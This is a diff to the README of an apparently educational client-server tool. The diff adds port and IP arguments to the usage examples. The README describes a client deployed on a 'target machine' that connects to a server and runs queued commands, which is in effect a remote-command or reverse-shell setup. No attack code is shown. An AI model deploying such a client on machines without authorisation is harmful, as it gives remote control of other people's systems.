@@ -31,15 +31,15 @@ make
 
 ## Usage
 
-First, you start the server with:
+First, you start the server with a (non-used) port (if none is provided, the program will ask you for it interactively). For example:
 ```bash
-./server
+./server 1234
 ```
-This ensures that the server is listening on a given port. It'll accept any incoming connection (keep in mind this is a demo tool; so this won't work over the Internet).
+This ensures that the server is listening on that port. It'll accept any incoming connection (keep in mind this is a demo tool; so this won't work over the Internet).
 
-Then start the client:
+Then start the client with both the server IP as well as its listening port (if none are provided, the program will ask you for them interactively). For example:
 ```bash
-./client
+./client 192.168.1.2 1234
 ```
 Theoretically, this client would be deployed on a target machine. It'll need to be running on that machine in order for the server to catch its connection attempt, and for it to execute any queued commands.
 
@@ -51,4 +51,4 @@ Theoretically, this client would be deployed on a target machine. It'll need to 
 - Linux
 
 # DISCLAIMER
-This tool is meant strictly for educational and demonstrative purposes.
+This tool is meant strictly for educational and demonstration purposes.
